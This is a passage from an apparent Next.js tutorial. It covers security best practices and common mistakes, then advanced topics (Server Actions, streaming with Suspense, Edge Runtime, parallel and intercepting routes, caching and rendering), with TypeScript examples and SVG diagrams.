  <text x="350" y="316" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="700">âœ… Business Logic â€” Handler Executes</text>

  <!-- Left reject arrows -->
  <line x1="100" y1="114" x2="55" y2="114" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>
  <line x1="100" y1="164" x2="55" y2="164" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>
  <line x1="100" y1="214" x2="55" y2="214" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>
  <line x1="100" y1="264" x2="55" y2="264" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#rq2)"/>

  <rect x="5" y="95" width="50" height="175" rx="6" fill="#7f1d1d"/>
  <text x="30" y="185" text-anchor="middle" fill="#fecaca" font-size="9" transform="rotate(-90, 30, 185)">REJECTED â†’</text>

  <defs>
    <marker id="rq1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#475569"/>
    </marker>
    <marker id="rq2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
  </defs>
</svg>
```

---

## 21.16 Security Best Practices

- âœ… Always hash passwords with bcrypt (cost factor â‰¥ 12) â€” never MD5 or SHA1
- âœ… Use `httpOnly`, `secure`, and `sameSite` on all authentication cookies
- âœ… Validate and sanitize **all** user inputs server-side, even if validated client-side
- âœ… Use parameterized queries or ORMs â€” never string-concatenate SQL
- âœ… Add rate limiting to all public-facing API routes, especially login
- âœ… Use environment variables for all secrets â€” never hardcode
- âœ… Validate env vars at startup with Zod to catch misconfigurations early
- âœ… Return generic error messages to clients â€” log detailed errors server-side
- âœ… Set appropriate security headers via `next.config.js`
- âœ… Use HTTPS everywhere â€” enforce HSTS in production
- âœ… Implement RBAC at the middleware level, not just in individual routes
- âœ… Audit log all authentication events (logins, failures, logouts)

---

## 21.17 Common Security Mistakes

| Mistake | Risk | Fix |
|---------|------|-----|
| Storing JWTs in `localStorage` | XSS can steal tokens | Use `httpOnly` cookies |
| Revealing if email exists on login | User enumeration | Always return generic "Invalid credentials" |
| No rate limiting on login | Brute force attacks | Limit by IP and account |
| Using `NEXT_PUBLIC_` for secrets | Secret exposed in browser bundle | Use server-only env vars |
| Trusting client-side auth checks | Easy to bypass in DevTools | Always verify on server |
| Not validating file uploads | Malicious file execution | Validate MIME type + scan |
| Verbose error messages | Leaks internal structure | Generic client errors |
| Skipping CSRF protection | Forged requests | Origin check + SameSite cookies |

---

## 21.18 Interview Questions â€” Security

**Beginner:**
1. What is XSS and how does Next.js/React protect against it by default?
2. What is the difference between authentication and authorization?
3. Why should you use `httpOnly` cookies for session tokens?

**Intermediate:**
4. How does CSRF work, and what two mechanisms does Next.js use to prevent it?
5. What is the purpose of the `NEXT_PUBLIC_` prefix in environment variables?
6. How would you implement rate limiting on a Next.js API route?

**Advanced:**
7. How would you design a complete RBAC system for a multi-tenant Next.js application?
8. What is a timing attack and how does bcrypt's constant-time comparison prevent it?
9. You find that JWTs are being stored in `localStorage` in a production app. What are the exact attack vectors, and what is your remediation plan?

---

# Section 22: Advanced Next.js Concepts

## 22.1 Server Actions

Server Actions are **async functions that run on the server** but can be called directly from Client Components. They eliminate the need to write separate API routes for form submissions and data mutations.

> **Simple analogy:** Instead of sending a letter to an office and waiting for a reply (API route), Server Actions let you press a button in the lobby that directly updates the filing cabinet inside â€” no round trip needed.

```tsx
// app/actions/posts.ts
'use server'; // Every export in this file becomes a Server Action

import { revalidatePath } from 'next/cache';
import { redirect } from 'next/navigation';
import { z } from 'zod';
import { prisma } from '@/lib/prisma';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth/options';

const CreatePostSchema = z.object({
  title: z.string().min(1).max(200),
  content: z.string().min(1),
});

// Server Action â€” callable from any Client Component
export async function createPost(formData: FormData) {
  // 1. Auth check (runs on server)
  const session = await getServerSession(authOptions);
  if (!session) {
    throw new Error('Unauthorized');
  }

  // 2. Extract and validate form data
  const raw = {
    title: formData.get('title'),
    content: formData.get('content'),
  };

  const parsed = CreatePostSchema.safeParse(raw);
  if (!parsed.success) {
    return { error: parsed.error.flatten().fieldErrors };
  }

  // 3. DB mutation
  await prisma.post.create({
    data: {
      ...parsed.data,
      authorId: session.user.id,
    },
  });

  // 4. Invalidate cached page data
  revalidatePath('/posts');

  // 5. Redirect (runs after response)
  redirect('/posts');
}

// Server Action with return value (for useFormState)
export async function deletePost(postId: string): Promise<{ success: boolean; error?: string }> {
  const session = await getServerSession(authOptions);
  if (!session) return { success: false, error: 'Unauthorized' };

  try {
    await prisma.post.delete({ where: { id: postId } });
    revalidatePath('/posts');
    return { success: true };
  } catch {
    return { success: false, error: 'Failed to delete post' };
  }
}
```

**Using Server Actions in a form:**

```tsx
// app/posts/new/page.tsx
'use client';

import { useFormState, useFormStatus } from 'react-dom';
import { createPost } from '@/app/actions/posts';

// Submit button â€” shows pending state automatically
function SubmitButton() {
  const { pending } = useFormStatus();
  return (
    <button
      type="submit"
      disabled={pending}
      className="px-4 py-2 bg-blue-600 text-white rounded disabled:opacity-50"
    >
      {pending ? 'Creating...' : 'Create Post'}
    </button>
  );
}

const initialState = { error: null };

export default function NewPostPage() {
  const [state, formAction] = useFormState(createPost, initialState);

  return (
    <form action={formAction} className="space-y-4">
      <div>
        <label htmlFor="title">Title</label>
        <input id="title" name="title" required className="border rounded p-2 w-full" />
        {state?.error?.title && (
          <p className="text-red-500 text-sm">{state.error.title[0]}</p>
        )}
      </div>

      <div>
        <label htmlFor="content">Content</label>
        <textarea id="content" name="content" rows={6} className="border rounded p-2 w-full" />
        {state?.error?.content && (
          <p className="text-red-500 text-sm">{state.error.content[0]}</p>
        )}
      </div>

      <SubmitButton />
    </form>
  );
}
```

---

## 22.2 Server Actions Flow Diagram

```txt
<svg viewBox="0 0 720 360" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="720" height="360" rx="14" fill="#0f172a"/>
  <text x="360" y="30" text-anchor="middle" fill="#f1f5f9" font-size="16" font-weight="700">Server Actions Workflow</text>

  <!-- Client side background -->
  <rect x="15" y="48" width="320" height="290" rx="10" fill="#0c1a3a" stroke="#1e40af" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="175" y="67" text-anchor="middle" fill="#3b82f6" font-size="11" font-weight="600">CLIENT BOUNDARY</text>

  <!-- Server side background -->
  <rect x="385" y="48" width="320" height="290" rx="10" fill="#0c2918" stroke="#065f46" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="545" y="67" text-anchor="middle" fill="#10b981" font-size="11" font-weight="600">SERVER BOUNDARY</text>

  <!-- Client: User interacts -->
  <rect x="35" y="85" width="150" height="50" rx="8" fill="#1e40af"/>
  <text x="110" y="106" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">User Interaction</text>
  <text x="110" y="122" text-anchor="middle" fill="#93c5fd" font-size="10">Form submit / button click</text>

  <!-- Client: Form state -->
  <rect x="35" y="165" width="150" height="50" rx="8" fill="#1e40af"/>
  <text x="110" y="186" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">useFormState</text>
  <text x="110" y="202" text-anchor="middle" fill="#93c5fd" font-size="10">Pending / result state</text>

  <!-- Client: Optimistic UI -->
  <rect x="35" y="250" width="150" height="50" rx="8" fill="#1e3a5f"/>
  <text x="110" y="271" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">Optimistic Update</text>
  <text x="110" y="287" text-anchor="middle" fill="#93c5fd" font-size="10">useOptimistic()</text>

  <!-- Arrows between client items -->
  <line x1="110" y1="135" x2="110" y2="165" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#sa1)"/>
  <line x1="110" y1="215" x2="110" y2="250" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#sa1)"/>

  <!-- Client â†’ Server: Action call -->
  <line x1="185" y1="110" x2="400" y2="110" stroke="#a78bfa" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#sa3)"/>
  <text x="292" y="105" text-anchor="middle" fill="#c4b5fd" font-size="9">action(formData)</text>

  <!-- Server: Auth check -->
  <rect x="410" y="85" width="150" height="50" rx="8" fill="#065f46"/>
  <text x="485" y="106" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="600">Auth + Validate</text>
  <text x="485" y="122" text-anchor="middle" fill="#34d399" font-size="10">Session Â· Zod schema</text>

  <!-- Server: DB mutation -->
  <rect x="410" y="165" width="150" height="50" rx="8" fill="#065f46"/>
  <text x="485" y="186" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="600">DB Mutation</text>
  <text x="485" y="202" text-anchor="middle" fill="#34d399" font-size="10">Prisma Â· SQL Â· ORM</text>

  <!-- Server: Revalidate -->
  <rect x="410" y="250" width="150" height="50" rx="8" fill="#065f46"/>
  <text x="485" y="271" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="600">revalidatePath()</text>
  <text x="485" y="287" text-anchor="middle" fill="#34d399" font-size="10">Purge cached data</text>

  <!-- Arrows between server items -->
  <line x1="485" y1="135" x2="485" y2="165" stroke="#10b981" stroke-width="1.5" marker-end="url(#sa2)"/>
  <line x1="485" y1="215" x2="485" y2="250" stroke="#10b981" stroke-width="1.5" marker-end="url(#sa2)"/>

  <!-- Server â†’ Client: Result -->
  <line x1="410" y1="185" x2="185" y2="185" stroke="#a78bfa" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#sa3)"/>
  <text x="297" y="180" text-anchor="middle" fill="#c4b5fd" font-size="9">{ error } | redirect()</text>

  <defs>
    <marker id="sa1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#3b82f6"/>
    </marker>
    <marker id="sa2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#10b981"/>
    </marker>
    <marker id="sa3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#a78bfa"/>
    </marker>
  </defs>
</svg>
```

---

## 22.3 Server Actions vs API Routes

| Aspect | Server Actions | API Routes |
|--------|---------------|------------|
| **Location** | `'use server'` in any file | `app/api/route.ts` |
| **Calling from client** | Direct function call | `fetch('/api/...')` |
| **Form integration** | Native `action={fn}` | Needs `onSubmit` + fetch |
| **Typesafety** | End-to-end with TypeScript | Manual type casting |
| **Revalidation** | `revalidatePath()` built-in | Manual `res.revalidate()` |
| **Boilerplate** | Minimal | More verbose |
| **External access** | âŒ Cannot be called externally | âœ… Public HTTP endpoint |
| **Best for** | Form mutations, internal data | Public APIs, webhooks |

---

## 22.4 Streaming & React Suspense

Streaming allows Next.js to **send HTML to the browser progressively** â€” the page shell renders immediately while slow data loads in the background. This dramatically improves Time-to-First-Byte (TTFB) and perceived performance.

```tsx
// app/dashboard/page.tsx â€” Streaming with Suspense
import { Suspense } from 'react';
import { DashboardStats } from '@/components/DashboardStats';
import { RecentOrders } from '@/components/RecentOrders';
import { UserActivity } from '@/components/UserActivity';
import { StatsLoading, OrdersLoading, ActivityLoading } from '@/components/Skeletons';

// Each component fetches its own data independently
export default function DashboardPage() {
  return (
    <div className="dashboard">
      <h1>Dashboard</h1>

      {/* Stats load independently â€” don't block the page */}
      <Suspense fallback={<StatsLoading />}>
        <DashboardStats />  {/* Fetches from /api/stats */}
      </Suspense>

      <div className="grid grid-cols-2 gap-6">
        {/* Orders and activity load in parallel */}
        <Suspense fallback={<OrdersLoading />}>
          <RecentOrders />  {/* Fetches from /api/orders */}
        </Suspense>

        <Suspense fallback={<ActivityLoading />}>
          <UserActivity />  {/* Fetches from /api/activity */}
        </Suspense>
      </div>
    </div>
  );
}
```

```tsx
// app/components/DashboardStats.tsx â€” Server Component with async data
async function getDashboardStats() {
  // This runs on the server â€” can be slow
  const [revenue, users, orders] = await Promise.all([
    fetch('https://api.example.com/revenue').then(r => r.json()),
    fetch('https://api.example.com/users/count').then(r => r.json()),
    fetch('https://api.example.com/orders/today').then(r => r.json()),
  ]);
  return { revenue, users, orders };
}

export async function DashboardStats() {
  const stats = await getDashboardStats(); // Suspense catches the promise

  return (
    <div className="grid grid-cols-3 gap-4">
      <StatCard label="Revenue" value={stats.revenue} />
      <StatCard label="Users" value={stats.users} />
      <StatCard label="Orders" value={stats.orders} />
    </div>
  );
}
```

---

## 22.5 Streaming Lifecycle Diagram

```txt
<svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="720" height="380" rx="14" fill="#0f172a"/>
  <text x="360" y="28" text-anchor="middle" fill="#f1f5f9" font-size="16" font-weight="700">Streaming Rendering Lifecycle</text>

  <!-- Timeline axis -->
  <line x1="60" y1="330" x2="680" y2="330" stroke="#475569" stroke-width="2"/>
  <text x="370" y="350" text-anchor="middle" fill="#64748b" font-size="10">Time â†’</text>

  <!-- T0 markers -->
  <line x1="80" y1="320" x2="80" y2="335" stroke="#64748b" stroke-width="1.5"/>
  <text x="80" y="348" text-anchor="middle" fill="#64748b" font-size="9">T=0</text>
  <line x1="200" y1="320" x2="200" y2="335" stroke="#64748b" stroke-width="1.5"/>
  <text x="200" y="348" text-anchor="middle" fill="#64748b" font-size="9">T=50ms</text>
  <line x1="380" y1="320" x2="380" y2="335" stroke="#64748b" stroke-width="1.5"/>
  <text x="380" y="348" text-anchor="middle" fill="#64748b" font-size="9">T=400ms</text>
  <line x1="580" y1="320" x2="580" y2="335" stroke="#64748b" stroke-width="1.5"/>
  <text x="580" y="348" text-anchor="middle" fill="#64748b" font-size="9">T=1200ms</text>

  <!-- Row labels -->
  <text x="55" y="80" text-anchor="end" fill="#94a3b8" font-size="10">Shell</text>
  <text x="55" y="140" text-anchor="end" fill="#94a3b8" font-size="10">Stats</text>
  <text x="55" y="200" text-anchor="end" fill="#94a3b8" font-size="10">Orders</text>
  <text x="55" y="260" text-anchor="end" fill="#94a3b8" font-size="10">Activity</text>

  <!-- Row dividers -->
  <line x1="60" y1="100" x2="680" y2="100" stroke="#1e293b" stroke-width="1"/>
  <line x1="60" y1="160" x2="680" y2="160" stroke="#1e293b" stroke-width="1"/>
  <line x1="60" y1="220" x2="680" y2="220" stroke="#1e293b" stroke-width="1"/>
  <line x1="60" y1="280" x2="680" y2="280" stroke="#1e293b" stroke-width="1"/>

  <!-- Shell: renders almost immediately -->
  <rect x="80" y="58" width="120" height="30" rx="6" fill="#065f46"/>
  <text x="140" y="77" text-anchor="middle" fill="#6ee7b7" font-size="10" font-weight="600">HTML Shell</text>

  <!-- Stats: skeleton then data -->
  <rect x="80" y="118" width="220" height="30" rx="6" fill="#374151" stroke="#4b5563" stroke-dasharray="4,2"/>
  <text x="190" y="137" text-anchor="middle" fill="#9ca3af" font-size="10">â³ Skeleton (loading.tsx)</text>
  <rect x="310" y="118" width="140" height="30" rx="6" fill="#1e40af"/>
  <text x="380" y="137" text-anchor="middle" fill="#bfdbfe" font-size="10" font-weight="600">âœ… Stats data</text>
  <line x1="310" y1="133" x2="310" y2="133" stroke="#a78bfa" stroke-width="1"/>
  <text x="312" y="112" fill="#c4b5fd" font-size="9">Streamed in</text>

  <!-- Orders: skeleton then data (slower) -->
  <rect x="80" y="178" width="380" height="30" rx="6" fill="#374151" stroke="#4b5563" stroke-dasharray="4,2"/>
  <text x="270" y="197" text-anchor="middle" fill="#9ca3af" font-size="10">â³ Skeleton</text>
  <rect x="470" y="178" width="130" height="30" rx="6" fill="#1e40af"/>
  <text x="535" y="197" text-anchor="middle" fill="#bfdbfe" font-size="10" font-weight="600">âœ… Orders</text>

  <!-- Activity: skeleton then data (medium) -->
  <rect x="80" y="238" width="300" height="30" rx="6" fill="#374151" stroke="#4b5563" stroke-dasharray="4,2"/>
  <text x="230" y="257" text-anchor="middle" fill="#9ca3af" font-size="10">â³ Skeleton</text>
  <rect x="390" y="238" width="150" height="30" rx="6" fill="#1e40af"/>
  <text x="465" y="257" text-anchor="middle" fill="#bfdbfe" font-size="10" font-weight="600">âœ… Activity</text>

  <!-- Without streaming label -->
  <rect x="80" y="45" width="530" height="12" rx="3" fill="#7f1d1d" opacity="0.3"/>
  <text x="345" y="55" text-anchor="middle" fill="#fca5a5" font-size="9">Without streaming: entire page waits until T=1200ms</text>

  <!-- Vertical line: first paint -->
  <line x1="200" y1="48" x2="200" y2="320" stroke="#34d399" stroke-width="1.5" stroke-dasharray="3,3"/>
  <text x="202" y="44" fill="#34d399" font-size="9">First Paint</text>
</svg>
```

---

## 22.6 Edge Runtime

The Edge Runtime runs your code **as close to the user as possible** using a lightweight V8 isolate (not full Node.js), distributed globally via CDN edge nodes.

```tsx
// app/api/geo/route.ts â€” Edge Runtime example
export const runtime = 'edge'; // Enable Edge Runtime

export async function GET(request: Request) {
  // Access geo data from edge (Vercel only)
  const { geo } = request as any;

  return Response.json({
    country: geo?.country ?? 'Unknown',
    city: geo?.city ?? 'Unknown',
    latency: 'sub-10ms', // Response from nearest edge node
  });
}
```

```tsx
// middleware.ts â€” Middleware ALWAYS runs on Edge Runtime
import { NextRequest, NextResponse } from 'next/server';

export function middleware(request: NextRequest) {
  const country = request.geo?.country;

  // Redirect based on geography â€” executed at the edge
  if (country === 'CN') {
    return NextResponse.redirect(new URL('/cn', request.url));
  }

  return NextResponse.next();
}
```

---

## 22.7 Edge vs Node.js Runtime Comparison

| Feature | Edge Runtime | Node.js Runtime |
|---------|-------------|-----------------|
| **Location** | CDN edge nodes globally | Single server region |
| **Cold start** | ~0ms (warm always) | 100msâ€“500ms |
| **Latency** | Sub-10ms globally | 50â€“200ms |
| **Memory limit** | 128MB | No practical limit |
| **Node.js APIs** | âŒ Not available | âœ… Full access |
| **File system** | âŒ No access | âœ… Full access |
| **npm packages** | Limited (no native bindings) | All packages |
| **Database direct** | âŒ (use HTTP clients) | âœ… Direct connections |
| **Best for** | Auth, redirects, A/B tests | Complex logic, DB access |

---

## 22.8 Parallel Routes

Parallel Routes allow you to render **multiple pages simultaneously in the same layout** â€” perfect for dashboards, split views, or modals.

```
app/
  layout.tsx           â† Contains @team and @analytics slots
  @team/
    page.tsx           â† Renders in team slot
  @analytics/
    page.tsx           â† Renders in analytics slot
  page.tsx
```

```tsx
// app/layout.tsx â€” Root layout with parallel route slots
interface LayoutProps {
  children: React.ReactNode;
  team: React.ReactNode;       // @team slot
  analytics: React.ReactNode;  // @analytics slot
}

export default function Layout({ children, team, analytics }: LayoutProps) {
  return (
    <div className="grid grid-cols-[1fr_300px] gap-6">
      <div className="main-content">
        {children}
      </div>
      <aside className="sidebar space-y-6">
        {team}       {/* Renders app/@team/page.tsx */}
        {analytics}  {/* Renders app/@analytics/page.tsx */}
      </aside>
    </div>
  );
}
```

---

## 22.9 Intercepting Routes

Intercepting Routes let you display content in a **modal or overlay** while keeping the original URL and allowing direct navigation to the full page.

```
app/
  photos/
    [id]/
      page.tsx         â† Full photo page (direct navigation)
  @modal/
    (.)photos/[id]/    â† (.) intercepts same-level route
      page.tsx         â† Photo shown in modal
  layout.tsx           â† Contains the @modal slot
```

```tsx
// app/@modal/(.)photos/[id]/page.tsx â€” Intercepting modal
import { PhotoModal } from '@/components/PhotoModal';

export default function PhotoModalPage({ params }: { params: { id: string } }) {
  return <PhotoModal photoId={params.id} />;
}
```

```tsx
// app/photos/[id]/page.tsx â€” Full page (when accessed directly)
import { PhotoDetail } from '@/components/PhotoDetail';

export default function PhotoPage({ params }: { params: { id: string } }) {
  return <PhotoDetail photoId={params.id} />;
}
```

**Interception conventions:**
| Convention | Intercepts |
|------------|-----------|
| `(.)` | Same level |
| `(..)` | One level up |
| `(..)(..)` | Two levels up |
| `(...)` | From root `app/` |

---

## 22.10 Route Hierarchy Diagram

```txt
<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="720" height="400" rx="14" fill="#0f172a"/>
  <text x="360" y="30" text-anchor="middle" fill="#f1f5f9" font-size="16" font-weight="700">Next.js App Router Hierarchy</text>

  <!-- Root app -->
  <rect x="290" y="50" width="140" height="50" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="360" y="70" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="700">app/</text>
  <text x="360" y="87" text-anchor="middle" fill="#93c5fd" font-size="10">layout.tsx Â· page.tsx</text>

  <!-- Branches from root -->
  <line x1="290" y1="75" x2="160" y2="130" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>
  <line x1="360" y1="100" x2="360" y2="130" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>
  <line x1="430" y1="75" x2="560" y2="130" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>

  <!-- dashboard segment -->
  <rect x="60" y="130" width="200" height="50" rx="8" fill="#1e40af"/>
  <text x="160" y="150" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">dashboard/</text>
  <text x="160" y="167" text-anchor="middle" fill="#93c5fd" font-size="9">layout Â· page Â· error Â· loading</text>

  <!-- parallel routes -->
  <rect x="270" y="130" width="180" height="50" rx="8" fill="#312e81"/>
  <text x="360" y="150" text-anchor="middle" fill="#c4b5fd" font-size="11" font-weight="700">@slot / Parallel</text>
  <text x="360" y="167" text-anchor="middle" fill="#a78bfa" font-size="9">@team Â· @analytics Â· @modal</text>

  <!-- blog segment -->
  <rect x="480" y="130" width="200" height="50" rx="8" fill="#1e40af"/>
  <text x="580" y="150" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">blog/</text>
  <text x="580" y="167" text-anchor="middle" fill="#93c5fd" font-size="9">layout Â· page</text>

  <!-- dashboard children -->
  <line x1="120" y1="180" x2="90" y2="230" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>
  <line x1="200" y1="180" x2="230" y2="230" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>

  <!-- settings -->
  <rect x="30" y="230" width="120" height="45" rx="8" fill="#1e3a5f"/>
  <text x="90" y="249" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">settings/</text>
  <text x="90" y="263" text-anchor="middle" fill="#93c5fd" font-size="9">page.tsx</text>

  <!-- analytics -->
  <rect x="175" y="230" width="120" height="45" rx="8" fill="#1e3a5f"/>
  <text x="235" y="249" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">analytics/</text>
  <text x="235" y="263" text-anchor="middle" fill="#93c5fd" font-size="9">page.tsx</text>

  <!-- blog children -->
  <line x1="550" y1="180" x2="520" y2="230" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>
  <line x1="610" y1="180" x2="640" y2="230" stroke="#475569" stroke-width="1.5" marker-end="url(#rh1)"/>

  <!-- [slug] -->
  <rect x="455" y="230" width="120" height="45" rx="8" fill="#065f46"/>
  <text x="515" y="249" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="600">[slug]/</text>
  <text x="515" y="263" text-anchor="middle" fill="#34d399" font-size="9">Dynamic segment</text>

  <!-- intercepting -->
  <rect x="600" y="230" width="100" height="45" rx="8" fill="#92400e"/>
  <text x="650" y="249" text-anchor="middle" fill="#fde68a" font-size="10" font-weight="600">(.)photos/</text>
  <text x="650" y="263" text-anchor="middle" fill="#fcd34d" font-size="9">Intercept</text>

  <!-- Legend -->
  <rect x="30" y="315" width="660" height="70" rx="8" fill="#1e293b" stroke="#334155"/>
  <text x="360" y="333" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="700">Legend</text>
  <rect x="50" y="340" width="14" height="14" rx="3" fill="#1e40af"/>
  <text x="70" y="352" fill="#94a3b8" font-size="10">Route Segment</text>
  <rect x="180" y="340" width="14" height="14" rx="3" fill="#312e81"/>
  <text x="200" y="352" fill="#94a3b8" font-size="10">Parallel Route (@slot)</text>
  <rect x="360" y="340" width="14" height="14" rx="3" fill="#065f46"/>
  <text x="380" y="352" fill="#94a3b8" font-size="10">Dynamic Route ([param])</text>
  <rect x="540" y="340" width="14" height="14" rx="3" fill="#92400e"/>
  <text x="560" y="352" fill="#94a3b8" font-size="10">Intercepting Route (.)</text>

  <defs>
    <marker id="rh1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#475569"/>
    </marker>
  </defs>
</svg>
```

---

## 22.11 Caching Strategies

Next.js has a multi-layered caching system. Understanding it is critical for performance.

| Cache Layer | What It Caches | Duration | Invalidation |
|-------------|---------------|----------|-------------|
| **Request Memoization** | Duplicate `fetch()` calls in one render | Per request | Automatic |
| **Data Cache** | `fetch()` response data | Persistent | `revalidatePath()`, `revalidateTag()` |
| **Full Route Cache** | Rendered HTML + RSC payload | Persistent | Rebuild / revalidation |
| **Router Cache** | Client-side route segments | 30sâ€“5min | Manual `router.refresh()` |

```tsx
// lib/data/posts.ts â€” Caching examples

// 1. Static cache â€” cached until revalidation (default)
export async function getPosts() {
  const res = await fetch('https://api.example.com/posts', {
    next: { tags: ['posts'] }, // Tag for targeted revalidation
  });
  return res.json();
}

// 2. Time-based revalidation (ISR behavior)
export async function getPopularPosts() {
  const res = await fetch('https://api.example.com/posts/popular', {
    next: { revalidate: 3600 }, // Revalidate every hour
  });
  return res.json();
}

// 3. No cache â€” always fresh (dynamic)
export async function getLivePrices() {
  const res = await fetch('https://api.example.com/prices', {
    cache: 'no-store', // Never cache
  });
  return res.json();
}

// 4. Tag-based revalidation in a Server Action
import { revalidateTag } from 'next/cache';

export async function publishPost(id: string) {
  'use server';
  await prisma.post.update({ where: { id }, data: { published: true } });
  revalidateTag('posts'); // Invalidates all fetches tagged with 'posts'
}
```

---

## 22.12 Static vs Dynamic Rendering

| Aspect | Static Rendering | Dynamic Rendering |
|--------|-----------------|-------------------|
| **When** | At build time | Per request |
| **Speed** | âš¡ Fastest (pre-built HTML) | Slower (real-time) |
| **Data** | Fixed at build | Always fresh |
| **Use case** | Blog, marketing, docs | Dashboard, user-specific pages |
| **CDN cacheable** | âœ… Yes | âŒ No |
| **Personalization** | âŒ None | âœ… Full |
| **Triggered by** | Default behavior | `cookies()`, `headers()`, `searchParams`, `no-store` |

```tsx
// app/blog/[slug]/page.tsx

// generateStaticParams â†’ Static (pre-rendered at build time)
export async function generateStaticParams() {
  const posts = await getPosts();
  return posts.map(post => ({ slug: post.slug }));
}

// If a slug isn't pre-rendered, generate it dynamically
export const dynamicParams = true; // default: true

export default async function BlogPost({ params }: { params: { slug: string } }) {
  const post = await getPost(params.slug);
  return <article>{post.content}</article>;
}
```

```tsx
// app/dashboard/page.tsx â€” Forces dynamic rendering
import { cookies } from 'next/headers'; // Opting into dynamic rendering

export default async function Dashboard() {
  const sessionCookie = cookies().get('session'); // Makes page dynamic
  const userData = await getUserData(sessionCookie?.value);

  return <DashboardView user={userData} />;
}
```

---

## 22.13 Rendering Workflow Diagram

```txt
<svg viewBox="0 0 720 360" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="720" height="360" rx="14" fill="#0f172a"/>
  <text x="360" y="28" text-anchor="middle" fill="#f1f5f9" font-size="16" font-weight="700">Next.js Rendering Decision Flow</text>

  <!-- Start -->
  <rect x="290" y="50" width="140" height="45" rx="8" fill="#1e40af"/>
  <text x="360" y="70" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">Page Request</text>
  <text x="360" y="86" text-anchor="middle" fill="#93c5fd" font-size="10">User visits URL</text>

  <line x1="360" y1="95" x2="360" y2="120" stroke="#475569" stroke-width="1.5" marker-end="url(#rd1)"/>

  <!-- Decision: Static params? -->
  <polygon points="360,120 460,150 360,180 260,150" fill="#374151" stroke="#6b7280"/>
  <text x="360" y="147" text-anchor="middle" fill="#f9fafb" font-size="10" font-weight="600">Uses dynamic</text>
  <text x="360" y="162" text-anchor="middle" fill="#f9fafb" font-size="10" font-weight="600">functions?</text>

  <!-- No â†’ Static -->
  <line x1="260" y1="150" x2="150" y2="150" stroke="#34d399" stroke-width="1.5" marker-end="url(#rd2)"/>
  <text x="205" y="143" text-anchor="middle" fill="#6ee7b7" font-size="10">NO</text>
  <rect x="30" y="125" width="120" height="50" rx="8" fill="#065f46"/>
  <text x="90" y="145" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="600">Static Cache</text>
  <text x="90" y="162" text-anchor="middle" fill="#34d399" font-size="9">Pre-built HTML</text>

  <!-- Yes â†’ Dynamic -->
  <line x1="460" y1="150" x2="570" y2="150" stroke="#f87171" stroke-width="1.5" marker-end="url(#rd3)"/>
  <text x="515" y="143" text-anchor="middle" fill="#fca5a5" font-size="10">YES</text>
  <rect x="570" y="125" width="120" height="50" rx="8" fill="#1e40af"/>
  <text x="630" y="145" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">Dynamic Render</text>
  <text x="630" y="162" text-anchor="middle" fill="#93c5fd" font-size="9">Per-request</text>

  <!-- Static â†’ CDN -->
  <line x1="90" y1="175" x2="90" y2="215" stroke="#34d399" stroke-width="1.5" marker-end="url(#rd2)"/>
  <rect x="30" y="215" width="120" height="50" rx="8" fill="#065f46"/>
  <text x="90" y="236" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="600">Serve from CDN</text>
  <text x="90" y="252" text-anchor="middle" fill="#34d399" font-size="9">~1ms response</text>

  <!-- Dynamic â†’ Server -->
  <line x1="630" y1="175" x2="630" y2="215" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#rd1)"/>
  <rect x="570" y="215" width="120" height="50" rx="8" fill="#1e3a5f"/>
